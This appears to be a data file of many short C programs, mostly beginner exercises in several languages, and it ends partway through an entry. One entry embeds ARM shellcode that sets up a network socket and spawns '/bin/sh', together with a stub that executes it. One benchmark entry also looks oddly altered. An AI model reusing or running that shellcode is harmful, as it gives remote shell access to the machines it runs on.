    "#include<stdio.h>\n#include<string.h>\nint main()\n{\n int i=0,n,len,j,num,count=0;\n char origin[1501],a[1501],name[1501];\n scanf(\"%d\",&n);\n scanf(\"%s\",origin);\n while(n--)\n {\n  i=0;\n  getchar();\n  memset(name,0,sizeof(name));\n  memset(a,0,sizeof(a));\n  while((name[i++]=getchar())!=':');\n  scanf(\"%s\",a);\n  name[i-1]='\\0';\n  name[i]=0;\n  len=strlen(origin);\n  num=0;\n  for(i=0;i<strlen(a);i++)\n  {\n   if(a[i]==origin[0])\n   {\n    num=0;\n    for(j=i;j<i+len;j++)\n    {\n     if(origin[j-i]==a[j])\n      num++;\n    }\n    if(num==len)\n     break;\n   }\n  }\n  if(num==len)\n  {\n   printf(\"%s\\n\",name);\n   count++;\n  }\n }\n if(count==0)\n  printf(\"none\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main(void){\n  char c;\n  int k;\n  printf(\"Inserisc chiave di cifratura:\");\n  scanf(\"%d\",&k);\n  while((c = getchar()) != '.'){\n    if ((0 ? isalpha(c) : (((unsigned)(c)|32)-'a') < 26)){\n      if (c<=90){\n        if (c+k >90){\n          int temp = 90-c;\n          putchar(64-temp+k);\n        }else{\n          putchar(c+k);\n        }\n      }else{\n        if (c+k >122){\n          int temp = 122-c;\n          putchar(96-temp+k);\n        }else{\n          putchar(c+k);\n        }\n      }\n    }else{\n      putchar(c);\n    }\n  }\n  printf(\"\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main ()\n{\n    float faren;\n    float celsius;\n    scanf (\"%f\", &faren);\n    celsius = (faren - 32) * 5/9;\n    printf (\"%.2f\\n\", celsius);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint ans(int m,int n);\nint main(int argc, char *argv[]) {\n int n,m;\n scanf(\"%d%d\",&m,&n);\n printf(\"%d\",ans(m,n));\n return 0;\n}\nint ans(int m,int n){\n if (m<n||m<1||n<1)\n  return 0;\n else if(n==1)\n  return m;\n else if(m==n)\n  return 1;\n else\n  return ans(m-1,n)+ans(m-1,n-1);\n}",
    "#include <stdlib.h>\n#include <string.h>\nint main(int argc, char* argv[]) {\n char testData[4];\n testData[0] = 'A';\n testData[1] = 'B';\n testData[2] = 'C';\n testData[3] = '\\0';\n stpncpy(&testData[0], &testData[2], 2);\n return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main() {\n  static void *an_alloc = ((void*)0);\n  an_alloc = malloc(500);\n  if (an_alloc != ((void*)0)) {\n    printf(\"ALLOCATED 500 BYTES AT %p\\n\", an_alloc);\n    memset(an_alloc, 42, 500);\n    free(an_alloc);\n  }\n  an_alloc = malloc(40000);\n  if (!an_alloc) {\n    puts(\"ALLOCATION FOR 40000 BYTES FAILED\");\n  } else {\n    printf(\"ALLOCATED 40000 BYTES AT %p\\n\", an_alloc);\n    free(an_alloc);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint main(){\n float comp,larg,preco,metragem;\n printf(\"Digite as dimensoes de LARGURA do terreno: \");\n scanf(\"%f\",&larg);\n printf(\"Digite as dimensoes de COMPRIMENTO do terreno: \");\n scanf(\"%f\",&comp);\n printf(\"Digite o Preco do arame: \");\n scanf(\"%f\",&preco);\n metragem = (larg+comp)*2;\n printf(\"\\n\\nPara cercar o Terreno de %0.1fm2 \\nira precisar de %0.1fm de Arame, \\ne ira gastar: R$%0.2f \\n\",larg*comp,metragem,metragem*preco);\n}",
    "#include <stdio.h>\nint main() {\n printf(\"%4d\\t%5d\\n%4d\\t%5d\\n%4d\\t%5d\\n%4d\\t%5d\\n\", 1990, 135, 1991, 7290, 1992, 11300, 1993, 16200);\n return 0;\n}",
    "int f(int x) {\n  return x + 10;\n}\nint main(void) {\n  return f(12);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\n\n\n\n\nint clear_text(char * text);\nint is_valid(char);\nint main(int argc, char * argv[]) {\n    char text[] = \"La Wanderlust indica il desiderio di andare altrove, di andare oltre il proprio mondo, di cercare qualcos'altro: un desiderio di esotismo, scoperta e viaggio. \";\n    int in_len, out_len;\n    out_len = clear_text(text);\n    printf(\"%s\\nRemoved: %d\\n\", text, out_len);\n    return 0;\n}\nint clear_text(char text[]){\n    int i, j;\n    for(i=0, j=0; text[i]!='\\0'; i++) {\n        if(is_valid(text[i])) {\n            text[j] = text[i];\n            j++;\n        }\n    }\n    text[j] = '\\0';\n    return (i-j);\n}\nint is_valid(char c) {\n    return ((c>='0' && c<='9') || (c>='A' && c<='Z') || (c>='a' && c<='z') || c==' ');\n}",
    "#include<stdio.h>\nvoid bfsnetworkflow();\nint n,p[102][102]={0},r[102][102]={0};\nint main()\n{\n int m,i,j,k,q;\n short M[1001],f[1001]={0};\n scanf(\"%d%d\",&m,&n);\n n++;\n for (i=1;i<=m;i++)\n  scanf(\"%d\",&M[i]);\n for (i=1;i<n;i++)\n {\n  scanf(\"%d\",&k);\n  for (j=0;j<k;j++)\n  {\n   scanf(\"%d\",&q);\n   if (f[q]==0)\n    p[0][i]+=M[q];\n   else p[f[q]][i]=10000;\n   f[q]=i;\n  }\n  scanf(\"%d\",&p[i][n]);\n }\n bfsnetworkflow();\n return 0;\n}\nvoid bfsnetworkflow()\n{\n int prev[102],minflow[102],queue[102];\n int i,j,v,pr,qs,qe,w;\n minflow[0]=10000;\n while(1)\n {\n  for(i=0;i<102;i++)\n   prev[i]=-2;\n  prev[0]=-1;\n  qs=0;\n  qe=1;\n  queue[qs]=0;\n  while(qs<qe && prev[n]==-2)\n  {\n   v=queue[qs++];\n   for(i=0;i<n+1;i++)\n   {\n    if(prev[i]==-2 && (pr=p[v][i]-r[v][i]))\n    {\n     prev[i]=v;\n     queue[qe++]=i;\n     minflow[i]=(minflow[v]<pr)?minflow[v]:pr;\n    }\n   }\n  }\n  if(prev[n]==-2)\n   break;\n  for(i=prev[n],j=n;i!=-1;j=i,i=prev[i])\n  {\n   r[i][j]+=minflow[n];\n   r[j][i]=-r[i][j];\n  }\n }\n for(i=0,w=0;i<n;i++)\n  w=w+r[i][n];\n printf(\"%d\\n\",w);\n}",
    "#include<stdlib.h>\n#include<stdio.h>\nint main(void)\n{\n char ch=88;\n printf(\"ch=%c\\n\",ch);\n char ch1='2' ;\n printf(\"ch1=%c\\n\",ch1);\n system(\"pause\");\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nvoid calcola_diff(char *src_path, char *dst_path);\nint main(void)\n{\n char src_path[100], dst_path[100];\n printf(\"Inserire path file di input: \");\n scanf(\"%100s\", src_path);\n printf(\"Inserire path file di output: \");\n scanf(\"%100s\", dst_path);\n calcola_diff(src_path, dst_path);\n return 0;\n}\nvoid calcola_diff(char *src_path, char *dst_path)\n{\n int x, y;\n FILE *src_f;\n FILE *dst_f;\n src_f = fopen(src_path, \"r\");\n dst_f = fopen(dst_path, \"w\");\n if(!src_f) {\n  printf(\"Errore apertura file input\\n\");\n }\n else if(!dst_f) {\n  printf(\"Errore apertura file output\\n\");\n }\n else {\n  while(fscanf(src_f, \"%d %d\", &x, &y)>0) {\n   fprintf(dst_f, \"%d\\n\", x-y);\n  }\n }\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n  typedef double Niz[10];\n  Niz Q[3];\n  printf(\"\\n%d\",sizeof(Niz));\n  printf(\"\\n%d\",sizeof Q);\n  printf(\"\\n%d\",sizeof Q[1]);\n  printf(\"\\n%d\\n\",sizeof Q[2][7]);\n  return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main() {\n    char * line = ((void*)0);\n    size_t alloc_len = 0;\n    ssize_t got = 0;\n    printf(\"line = %p\\n\", (void *) line);\n    printf(\"alloc_len = %zu\\n\", alloc_len);\n    printf(\"Enter your name: \");\n    got = getline(&line, &alloc_len, (stdin));\n    printf(\"got = %zu\\n\", got);\n    if (got < 0) {\n        abort();\n    }\n    printf(\"line = %p\\n\", (void *) line);\n    printf(\"alloc_len = %zu\\n\", alloc_len);\n    printf(\"strlen(line) = %zu\\n\", strlen(line));\n    size_t line_len = strlen(line);\n    if (\n        line_len > 0\n        && line[line_len - 1] == '\\n'\n    ) {\n        line[line_len - 1] = '\\0';\n    }\n    printf(\"Hello, %s!\\n\", line);\n    free(line);\n}",
    "int main()\n{\n int a;\n int b;\n a = 2;\n b = 2;\n if(a == b)\n {\n  b = 4;\n  a = 7;\n }\n return a + b;\n}",
    "#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/stat.h>\n#include <sys/types.h>\n#include <err.h>\n#include <stdint.h>\n\nint main()\n{\n if (execlp(\"date\", \"date\", (char*) ((void*)0)) == -1)\n {\n  err(1, \"Error executing command date.\");\n }\n}",
    "#include <stdio.h>\nint main(){\n char a1 = 65;\n char a2 = 112;\n char a3 = 112;\n char a4 = 108;\n char a5 = 101;\n char a6 = 58;\n char a7 = 41;\n printf(\"%c%c%c%c%c%c%c\\n\", a1, a2, a3, a4, a5, a6, a7);\n a1 = 'A';\n a2 = 'p';\n a3 = 'p';\n a4 = 'l';\n a5 = 'e';\n a6 = ':';\n a7 = ')';\n printf(\"%c%c%c%c%c%c%c\\n\", a1, a2, a3, a4, a5, a6, a7);\n return 0;\n}",
    "#include<stdint.h>\nint main(void)\n{\n uint32_t *pRccClkCtrl = (uint32_t*)(0x40023800UL + 0x00UL);\n *pRccClkCtrl |= (1 << 18);\n *pRccClkCtrl |= (1 << 16);\n uint32_t *pRccClkCfg = (uint32_t*)(0x40023800UL + 0x08UL);\n *pRccClkCfg |= (1 << 0);\n *pRccClkCfg |= (2 << 21);\n uint32_t *pRccClkGpioA = (uint32_t*)(0x40023800UL + 0x30UL);\n *pRccClkGpioA |= (1 << 0);\n uint32_t *pGpioAMode = (uint32_t*)(0x40020000UL + 0x0UL);\n *pGpioAMode |= (2 << 16);\n uint32_t *pGpioAAltHigh = (uint32_t*)(0x40020000UL + 0x24UL);\n *pGpioAAltHigh &= ~(0xf << 0);\n for(;;);\n}",
    "#include <stdio.h>\nconst int size = 100;\nint main (void) {\n  int k = 0, i = 0, l = 0;\n  int sum = 0;\n  int a[size][size][size];\n for (l = 0; l < size; l++) {\n    for (k = 0; k < size; k++) {\n      for (i = 0; i < size; i++) {\n a[l][k][i] = 10;\n      }\n    }\n  }\n  for (l = 0; l < size; l++) {\n    for (k = 0; k < size; k++) {\n      for (i = 0; i < size; i++) {\n sum += a[l][k][i];\n      }\n    }\n  }\n  printf (\"sum is %d\", sum);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <math.h>\nvoid helptext(char* p_name)\n{\n   printf(\"Usage: %s -a <amount> -i <interest rate> -d <duration>\\n\", p_name);\n}\nint main(int argc, char** argv)\n{\n   int amount=0;\n   int duration=0;\n   double interest_rate=0, rm, dm;\n   double top_line, bottom_line, mp, ap;\n   if ( argc < 6 ) {\n      helptext(argv[0]);\n      exit(-1);\n   }\n   int i=1;\n   while (i < argc ) {\n      if ( strcmp(argv[i], \"-a\")==0 ) {\n         i++;\n         amount=atoi(argv[i]);\n      }\n      if ( strcmp(argv[i], \"-i\")==0 ) {\n         i++;\n         interest_rate=atof(argv[i]);\n      }\n      if ( strcmp(argv[i], \"-d\")==0 ) {\n         i++;\n         duration=atoi(argv[i]);\n      }\n      i++;\n   }\n   if ( amount == 0 || interest_rate == 0 || duration == 0 ) {\n      helptext(argv[0]);\n      exit(-1);\n   }\n   printf(\"Amount=\u00a3%d\\nInterest=%5.2f%%\\nDuration=%d years\\n\", amount, interest_rate, duration);\n   rm = interest_rate / 12;\n   dm = duration * 12;\n   top_line = ( amount * rm * pow(( 1 + ( rm / 100 )),dm) );\n   bottom_line = 100 * ( pow((1 + ( rm / 100 )),dm) -1);\n   mp = top_line / bottom_line;\n   ap = mp * 12;\n   printf(\"Annual replayments will be \u00a3%8.2f\\n\", ap);\n   printf(\"Monthly replayments will be \u00a3%7.2f\\n\", mp);\n   printf(\"Total cost of loan is \u00a3%8.2f\\n\", (ap * duration));\n   exit(0);\n}",
    "#include <stdio.h>\nint sumOfRange(int);\nint main() {\n   int n1 = 0;\n   int sum = 0;\n   printf(\"\\n\\n Recursion : calculate the sum of numbers from 1 to n :\\n\");\n   printf(\"-----------------------------------------------------------\\n\");\n   printf(\" Input the last number of the range starting from 1 : \");\n   scanf(\"%d\", &n1);\n   sum = sumOfRange(n1);\n   printf(\"\\n The sum of numbers from 1 to %d : %d\\n\\n\", n1, sum);\n   return (0);\n}\nint sumOfRange(int n1) {\n   int result = 0;\n   if (n1 == 1) {\n      return 1;\n   }\n   else {\n     result = n1 + sumOfRange(n1 - 1);\n   }\n   return result;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\nint main(void)\n{\n _Bool x = 1;\n _Bool y = 0;\n if (x)\n  puts(\"This will print!\");\n if (!y)\n  puts(\"This will also print!\");\n}",
    "#include <stdio.h>\n\n\n\nint main(void) {\n  int x;\n\n\n\n  printf(\"not debugging\");\n\n  return 0;\n}",
    "#include <stdio.h>\nvoid interchange(int *u, int *v);\nint main(void)\n{\n int x = 5, y = 10;\n printf(\"Originally x = %d and y = %d.\\n\", x, y);\n interchange(&x, &y);\n printf(\"Now x = %d and y = %d.\\n\", x, y);\n return 0;\n}\nvoid interchange(int *u, int *v)\n{\n int temp;\n temp = *u;\n *u = *v;\n *v = temp;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int sum;\n    sum=50+25;\n    printf(\"The sum of 50 and 25 is %i\\n\",sum);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a,b;\n b = 10;\n for( a=1 ; a<10 ; a++)\n {\n  printf(\"%2d %2d\\n\",a,b);\n  b--;\n }\n return(0);\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n char array[256];\n int len = 0;\n while (len < 256)\n {\n  scanf(\"%c\", &array[len]);\n  if (array[len] == '\\n') break;\n  len ++;\n }\n for (int i = len - 1; i>=0; i--)\n {\n  printf(\"%c\", array[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint inverte(int num)\n{\n    const int DIVISOR = 10;\n    int numInvertido = 0;\n    int peso = 1;\n    while(num / peso != 0)\n        peso *= 10;\n    if(peso > 1)\n        peso /= 10;\n    for(peso; num != 0; peso /= 10){\n        numInvertido += (num % DIVISOR) * peso;\n        num /= DIVISOR;\n    }\n    return numInvertido;\n}\nint main(void)\n{\n    int* listaNumeros = ((void*)0);\n    int quant;\n    int i;\n    scanf(\" %d\", &quant);\n    listaNumeros = (int*) malloc(quant * sizeof (int));\n    for(i = 0; i < quant; i++)\n        scanf(\" %d\", &listaNumeros[i]);\n    for(i = 0; i < quant; i++){\n        if(listaNumeros[i] == inverte(listaNumeros[i]))\n            printf(\"yes\");\n        else\n            printf(\"no\");\n        if(i + 1 < quant)\n            printf(\" \");\n        else\n            printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid GetBaseNumber(unsigned num, unsigned base, char* snum, unsigned n){\n unsigned i;\n unsigned tmp = num;\n char hexstr[17] = \"0123456789ABCDEF\";\n for(i=0;i<n;i++){\n  snum[n-i-1] = hexstr[tmp % base];\n  tmp /= base;\n }\n snum[n] = '\\0';\n}\nint main(int argc, char *argv[]) {\n unsigned num = 0;\n char snum[33] = \"\";\n printf(\"Input A Number: \");\n scanf(\"%u\", &num);\n printf(\"dec: %u\\n\", num);\n GetBaseNumber(num, 2, snum, 32);\n printf(\"bin: %s\\n\", snum);\n GetBaseNumber(num, 8, snum, 11);\n printf(\"oct: %s\\n\", snum);\n GetBaseNumber(num, 16, snum, 8);\n printf(\"hex: %s\\n\", snum);\n return 0;\n}",
    "#include <stdio.h>\n\nvoid saisir(int tab[], int len);\nvoid affiche_2D(int tab[], int len, int h);\nint main() {\n    int h;\n    int tab[14];\n    saisir(tab, 14);\n    printf(\"Combien de lignes voulez-vous?\\n>>> \");\n    scanf(\"%d\", &h);\n    affiche_2D(tab, 14, h);\n    return 0;\n}\nvoid saisir(int tab[], int len) {\n    int i = 0;\n    printf(\"Veuillez rentrer %d entiers:\\n\", len);\n    while (i < len) {\n        printf(\">>> \");\n        scanf(\"%d\", &(tab[i]));\n        i++;\n    }\n}\nvoid affiche_2D(int tab[], int len, int h) {\n    for (int i = 0; i < h; i++) {\n        for (int j = i; j< len; j+=h) {\n            printf(\"%d\\t\", tab[j]);\n        }\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nchar *code=\"\\x02\\x00\\xa0\\xe3\\x01\\x10\\xa0\\xe3\\x00\\x20\\xa0\\xe3\\xa0\\x70\\x9f\\xe5\\x00\\x00\\x00\\xef\\x00\\x60\\xa0\\xe1\\x5c\\x10\\xa0\\xe3\\x11\\x50\\xa0\\xe3\\x01\\x1c\\xa0\\xe1\\x05\\x18\\x81\\xe0\\x02\\x10\\x81\\xe2\\x02\\x20\\x42\\xe0\\x06\\x00\\x2d\\xe9\\x0d\\x10\\xa0\\xe1\\x10\\x20\\xa0\\xe3\\x06\\x00\\xa0\\xe1\\x70\\x70\\x9f\\xe5\\x00\\x00\\x00\\xef\\x06\\x00\\xa0\\xe1\\x01\\x10\\xa0\\xe3\\x47\\x7f\\xa0\\xe3\\x00\\x00\\x00\\xef\\x06\\x00\\xa0\\xe1\\x01\\x10\\x41\\xe0\\x02\\x20\\x42\\xe0\\x50\\x70\\x9f\\xe5\\x00\\x00\\x00\\xef\\x02\\x10\\xa0\\xe3\\x3f\\x70\\xa0\\xe3\\x00\\x00\\x00\\xef\\x01\\x10\\x41\\xe2\\x01\\x00\\x71\\xe3\\xfa\\xff\\xff\\x1a\\x0f\\x00\\xa0\\xe1\\x20\\x00\\x80\\xe2\\x02\\x20\\x42\\xe0\\x05\\x00\\x2d\\xe9\\x0d\\x10\\xa0\\xe1\\x0b\\x70\\xa0\\xe3\\x00\\x00\\x00\\xef\\x00\\x00\\xa0\\xe3\\x01\\x70\\xa0\\xe3\\x00\\x00\\x00\\xef\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x19\\x01\\x00\\x00\\x1a\\x01\\x00\\x00\\x1d\\x01\\x00\\x00\";\nint main(void) {\n  (*(void(*)()) code)();\n  return 0;\n}",
    "int f(int f)\n{\n return f;\n}\nint main()\n{\n return f(2);\n}",
    "#include <stdio.h>\nint main() {\n    char C;\n    scanf(\"%c \\n\", &C);\n    if (C == 'A' || C == 'E' || C == 'I' || C == 'O' || C == 'U') {\n        printf(\"Vowel\\n\");\n    } else {\n        printf(\"Consonant\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid display(int a[],int n){\n    for(int i=0;i<n;i++){\n        printf(\"%d\\t\",a[i]);\n    }\n}\nvoid swap(int* a,int* b){\n    int t=*a;\n    *a=*b;\n    *b=t;\n}\nvoid sort(int a[],int n){\n    int mid=0;\n    int l=0;\n    int h=n-1;\n    while(mid<=h){\n        switch(a[mid]){\n            case 0:\n                swap(&a[mid],&a[l]);\n                l++;\n                mid++;\n                break;\n            case 1:\n                mid++;\n                break;\n            case 2:\n                swap(&a[mid],&a[h]);\n                h--;\n                break;\n        }\n    }\n}\nint main(){\n    int a[]={1,1,0,2,2,0,0,0,1,2};\n    int n=sizeof(a)/sizeof(a[0]);\n    printf(\"Input array:\\n\");\n    display(a,n);\n    sort(a,n);\n    printf(\"\\nSorted array:\\n\");\n    display(a,n);\n    return 0;\n}",
    "#include <stdio.h>\nint functionA(int a,int b);\nint functionB(int c,int (*a)(int,int));\nvoid callback(int result);\nint functionC(int a,void (*callbackPointer) (int));\nint functionA(int a,int b){\n    return a*b;\n}\nint functionB(int c,int (*a)(int,int)){\n    return a(c+1,c+2);\n}\nvoid callback(int result){\n    printf(\"callback result:%d\",result);\n}\nint functionC(int a,void (*callbackPointer) (int)){\n    callbackPointer(functionB(a,functionA));\n}\nint main(){\n    int result = functionB(4,&functionA);\n    printf(\"functionB result:%d\\n\",result);\n    void (*callbackPointer) (int) = &callback;\n    functionC(result,callbackPointer);\n}",
    "#include <stdio.h>\nint main () {\n   int hightech;\n   char kgb[10];\n   printf(\"Address of hightech variable: %x\\n\", &hightech );\n   printf(\"Address of kgb variable: %x\\n\", &kgb );\n   return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main(void) {\n    double x1 = 0.0;\n    double y1 = 0.0;\n    double x2 = 0.0;\n    double y2 = 0.0;\n    double d = 0.0;\n    scanf(\"%lf %lf\", &x1, &y1);\n    scanf(\"%lf %lf\", &x2, &y2);\n    d = sqrt(pow(x2 - x1, 2) + pow(y2 - y1, 2));\n    printf(\"%.4lf\\n\", d);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a, b, x;\n    scanf(\"%d %d\", &a, &b);\n    x=a+b;\n    printf(\"X = %d\\n\",x);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid reverseString(void)\n{\n    char *src = \"hello world\";\n    int len = strlen(src);\n    char *dest = (char *)malloc(len + 1);\n    char *d = dest;\n    char *s = &src[len - 1];\n    while (len-- != 0)\n    {\n        *d++ = *s--;\n    }\n    *d = 0;\n    printf(\"dest is %s\", dest);\n    free(dest);\n    dest = ((void*)0);\n}\nint main(void)\n{\n    reverseString();\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int N;\n scanf(\"%d\", &N);\n if(N == 1) { printf(\"1\\n\"); return 0; }\n if(N == 2) { printf(\"2\\n\"); return 0; }\n int a = 1, b = 2, c;\n int i;\n for(i=1;i<N-1;i++)\n {\n  c = a + b;\n  if(c >= 15746) c -= 15746;\n  a = b;\n  b = c;\n }\n printf(\"%d\\n\", c % 15746);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(void){\n float n=1;\n do{\n  printf(\"Numero real nao negativo? \");\n     scanf(\"%f\", &n);\n }while (n<=0);\n n = sqrt(n);\n printf(\"%f\\n\", n);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int n;\n    printf(\"Enter the length (n) of the integer array to be allocated: \");\n    scanf(\"%d\", &n);\n    int *a = (int *)malloc(n*sizeof(int));\n    int *tem = a;\n    printf(\"Current Memory block address: %0x\\n\\n\", a);\n    printf(\"Enter the new length (n) of the integer array: \");\n    scanf(\"%d\", &n);\n    a = (int *)realloc(a, n*sizeof(int));\n    printf(\"Current Memory block address: %0x\\n\\n\", tem);\n    if(tem==a){\n        printf(\"Memory Location Unchanged.\\n\");\n    }\n    else {\n        printf(\"Memory Location Changed.\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble nulltime, TimeArray[3];\ndouble TLimit;\ndouble T[36];\ndouble sa,sb,sc,sd,one,two,three;\ndouble four,five,piref,piprg;\ndouble scale,pierr;\ndouble A0 = 1.0;\ndouble A1 = -0.1666666666671334;\ndouble A2 = 0.833333333809067E-2;\ndouble A3 = 0.198412715551283E-3;\ndouble A4 = 0.27557589750762E-5;\ndouble A5 = 0.2507059876207E-7;\ndouble A6 = 0.164105986683E-9;\ndouble B0 = 1.0;\ndouble B1 = -0.4999999999982;\ndouble B2 = 0.4166666664651E-1;\ndouble B3 = -0.1388888805755E-2;\ndouble B4 = 0.24801428034E-4;\ndouble B5 = -0.2754213324E-6;\ndouble B6 = 0.20189405E-8;\ndouble C0 = 1.0;\ndouble C1 = 0.99999999668;\ndouble C2 = 0.49999995173;\ndouble C3 = 0.16666704243;\ndouble C4 = 0.4166685027E-1;\ndouble C5 = 0.832672635E-2;\ndouble C6 = 0.140836136E-2;\ndouble C7 = 0.17358267E-3;\ndouble C8 = 0.3931683E-4;\ndouble D1 = 0.3999999946405E-1;\ndouble D2 = 0.96E-3;\ndouble D3 = 0.1233153E-5;\ndouble E2 = 0.48E-3;\ndouble E3 = 0.411051E-6;\nint main()\n{\n\n\n\n   double s,u,v,w,x;\n\n   long loops, NLimit;\n   register long i, m, n;\n   printf(\"\\n\");\n   printf(\"   FLOPS C Program (Double Precision), V2.0 18 Dec 1992\\n\\n\");\n   loops = 15625;\n   TLimit = 1.0;\n   NLimit = 512000000;\n   piref = 3.14159265358979324;\n   one = 1.0;\n   two = 2.0;\n   three = 3.0;\n   four = 4.0;\n   five = 5.0;\n   scale = one;\n   printf(\"   Module     Error        RunTime      MFLOPS\\n\");\n   printf(\"                            (usec)\\n\");\n\n\n\n   m = loops*10000;\n\n   x = piref / ( four * (double)m );\n   s = 0.0;\n   v = 0.0;\n   for( i = 1 ; i <= m-1 ; i++ )\n   {\n   u = (double)i * x;\n   w = u * u;\n   v = u * ((((((A6*w+A5)*w+A4)*w+A3)*w+A2)*w+A1)*w+one);\n   s = s + v*(w*(w*(w*(w*(w*(B6*w+B5)+B4)+B3)+B2)+B1)+one);\n   }\n   u = piref / four;\n   w = u * u;\n   sa = u*((((((A6*w+A5)*w+A4)*w+A3)*w+A2)*w+A1)*w+one);\n   sb = w*(w*(w*(w*(w*(B6*w+B5)+B4)+B3)+B2)+B1)+one;\n   sa = sa * sb;\n   sa = x * ( sa + two * s ) / two;\n   sb = 0.25;\n   sc = sa - sb;\n   printf(\"     6   %13.4lf  %10.4lf  %10.4lf\\n\",\n          sc*\n  1e-30,\n          0*\n 1e-30 ,\n          0*\n  1e-30);\n   return 0;\n}",
    "#include <stdio.h>\nint main (void) {\n printf(\"Enter some character.\\n\");\n printf(\"'getchar() != EOF' value : %d\\n\", getchar() != (-1));\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a,b;\n    char c;\n    printf(\"Enter any 2 integers [SEPERATED BY A TAB]: \");\n    scanf(\"%d%d\",&a,&b);\n    fflush((stdin));\n    printf(\"Enter a operator(+, -, *, / or %): \");\n    scanf(\"%c\",&c);\n    if (c=='+')\n        printf(\"\\n%d + %d = %d\\n\",a,b,a+b);\n    else if (c=='-')\n        printf(\"\\n%d - %d = %d\\n%d - %d = %d\\n\",a,b,a-b,b,a,b-a);\n    else if (c=='*')\n        printf(\"\\n%d * %d = %d\\n\",a,b,a*b);\n    else if (c=='/')\n        printf(\"\\n%d / %d = %.2f\\n%d / %d = %.2f\\n\",a,b,a*1.0/b*1.0,b,a,b*1.0/a*1.0);\n    else if (c=='%')\n        printf(\"\\n%d %c %d = %d\\n%d %c %d = %d\\n\",a,'%',b,a%b,b,'%',a,b%a);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\nint search(char *filename, char *str) {\n    FILE * pFile;\n    pFile = fopen(filename, \"r\");\n    if (pFile == ((void*)0)) {\n        return -1;\n    }\n    char line[256];\n    int strLen = strlen(str), sol = 0;\n    while (fgets(line, 256, pFile) != ((void*)0)) {\n        char * ptr = line;\n        while ((ptr = strstr(ptr, str)) != ((void*)0)) {\n            sol += 1;\n            ptr += strlen(str);\n        }\n    }\n    fclose(pFile);\n    return sol;\n}\nint main() {\n    int result = search(\"alex.txt\", \"bla\");\n    printf(\"%d\", result);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n\nint main(void)\n{\n  _Bool digit_seen[10] = {0};\n  long numbers[100], n;\n  int digit;\n  printf(\"Enter space-separated numbers (0 or negative to terminate): \");\n  for (int i = 0; i < 100; i++) {\n    scanf(\"%ld\", &numbers[i]);\n  }\n  for (int i = 0; i < 100; i++)\n  {\n    n = numbers[i];\n    if (n <= 0)\n      break;\n    while (n > 0) {\n      digit = n % 10;\n      if (digit_seen[digit])\n        break;\n      digit_seen[digit] = 1;\n      n /= 10;\n    }\n    if (n > 0)\n      printf(\"Repeated digit: %ld\\n\", numbers[i]);\n    else\n      printf(\"No repeated digit: %ld\\n\", numbers[i]);\n    for (int i = 0; i < 10; i++)\n      digit_seen[i] = 0;\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint add(int a, int b) { return a + b; }\nint main() {\n  int a = 3, b = 4;\n  printf(\"%d\\n\", add(a, b));\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n   int N,soma,i;\n   printf(\"Digite o valor N:\");\n   scanf(\"%d\",&N);\n   int A[N];\n   soma=0;\n   for(i=0;i<N;i++){\n       printf(\"A[%d]\",i);\n       scanf(\"%d\",&A[i]);\n       if(i%2==0){\n           soma+=A[i];\n       }\n   }\n   printf(\"%d\",soma);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    printf(\"OOOO\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <pthread.h>\n\nvoid *thread_inc(void *arg);\nvoid *thread_des(void *arg);\nlong long num = 0;\npthread_mutex_t mutex;\nint main() {\n    pthread_t thread_id[100];\n    int i;\n    printf(\"sizeof long long: %ld\\n\", sizeof(long long));\n    for (i = 0; i < 100; i++) {\n        if (i % 2)\n            pthread_create(&(thread_id[i]), ((void*)0), thread_inc, ((void*)0));\n        else\n            pthread_create(&(thread_id[i]), ((void*)0), thread_des, ((void*)0));\n    }\n    for (i = 0; i < 100; i++)\n        pthread_join(thread_id[i], ((void*)0));\n    printf(\"result is %lld\\n\", num);\n    return 0;\n}\nvoid *thread_inc(void *arg) {\n    int i;\n    pthread_mutex_lock(&mutex);\n    for (i = 0; i < 50000000; i++) {\n        num += 1;\n    }\n    pthread_mutex_unlock(&mutex);\n    return ((void*)0);\n}\nvoid *thread_des(void *arg) {\n    int i;\n    pthread_mutex_lock(&mutex);\n    for (i = 0; i < 50000000; i++) {\n        num -= 1;\n    }\n    